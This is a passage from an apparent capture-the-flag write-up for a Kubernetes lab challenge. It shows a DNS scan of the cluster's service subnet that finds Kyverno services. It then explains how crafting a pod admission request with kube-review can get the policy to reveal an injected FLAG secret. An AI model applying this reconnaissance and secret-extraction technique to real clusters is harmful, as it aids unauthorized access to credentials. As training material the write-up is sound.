        patchStrategicMerge:
          spec:
            containers:
              - name: "*"
                env:
                  - name: FLAG
                    value: "{flag}"
```

### dnscan 

```bash
player@wiz-k8s-lan-party:~$ cat /etc/resolv.conf 
search k8s-lan-party.svc.cluster.local svc.cluster.local cluster.local us-west-1.compute.internal
nameserver 10.100.86.83
options ndots:5
player@wiz-k8s-lan-party:~$ dnscan -subnet 10.100.*.*
22071 / 65536 [------------------------------------------>____________________________________________________________________________________] 33.68% 987 p/s10.100.86.210 kyverno-cleanup-controller.kyverno.svc.cluster.local.
32183 / 65536 [-------------------------------------------------------------->________________________________________________________________] 49.11% 990 p/s10.100.126.98 kyverno-svc-metrics.kyverno.svc.cluster.local.
40485 / 65536 [------------------------------------------------------------------------------>________________________________________________] 61.78% 989 p/s10.100.158.213 kyverno-reports-controller-metrics.kyverno.svc.cluster.local.
43840 / 65536 [------------------------------------------------------------------------------------>__________________________________________] 66.89% 989 p/s10.100.171.174 kyverno-background-controller-metrics.kyverno.svc.cluster.local.
55700 / 65536 [----------------------------------------------------------------------------------------------------------->___________________] 84.99% 989 p/s10.100.217.223 kyverno-cleanup-controller-metrics.kyverno.svc.cluster.local.
59244 / 65536 [------------------------------------------------------------------------------------------------------------------>____________] 90.40% 987 p/s10.100.232.19 kyverno-svc.kyverno.svc.cluster.local.
65358 / 65536 [------------------------------------------------------------------------------------------------------------------------------>] 99.73% 987 p/s10.100.86.210 -> kyverno-cleanup-controller.kyverno.svc.cluster.local.
10.100.126.98 -> kyverno-svc-metrics.kyverno.svc.cluster.local.
10.100.158.213 -> kyverno-reports-controller-metrics.kyverno.svc.cluster.local.
10.100.171.174 -> kyverno-background-controller-metrics.kyverno.svc.cluster.local.
10.100.217.223 -> kyverno-cleanup-controller-metrics.kyverno.svc.cluster.local.
10.100.232.19 -> kyverno-svc.kyverno.svc.cluster.local.
player@wiz-k8s-lan-party:~$
```

```bash
s10.100.86.210 -> kyverno-cleanup-controller.kyverno.svc.cluster.local.
10.100.126.98 -> kyverno-svc-metrics.kyverno.svc.cluster.local.
10.100.158.213 -> kyverno-reports-controller-metrics.kyverno.svc.cluster.local.
10.100.171.174 -> kyverno-background-controller-metrics.kyverno.svc.cluster.local.
10.100.217.223 -> kyverno-cleanup-controller-metrics.kyverno.svc.cluster.local.
10.100.232.19 -> kyverno-svc.kyverno.svc.cluster.local.
```

---

Kyverno is a Kubernetes tool that assists in managing configurations and enforcing policies within clusters. It manages compliance and security by providing definitions of rules using custom resource definitions (CRDs), offering fine-grained control over resource behavior and management.

The policy defined in the challenge is to state that any pod being created within the sensitive-ns will have the secret injected into the FLAG env variable.


---


To generate a pod admission request, we can make use of a utility named kube-review based on hints. I saved a pod in a yaml file with following code:

---

apiVersion: v1
kind: Pod
metadata:
  name: sensitive-pod
  namespace: sensitive-ns
spec:
  containers:
  - name: nginx
    image: nginx:latest

---


To generate the admission request, download [kube-review](https://github.com/anderseknert/kube-review?tab=readme-ov-file)
locally and execute the following command:

```./kube-review-darwin-amd64 create pod.yaml```


---







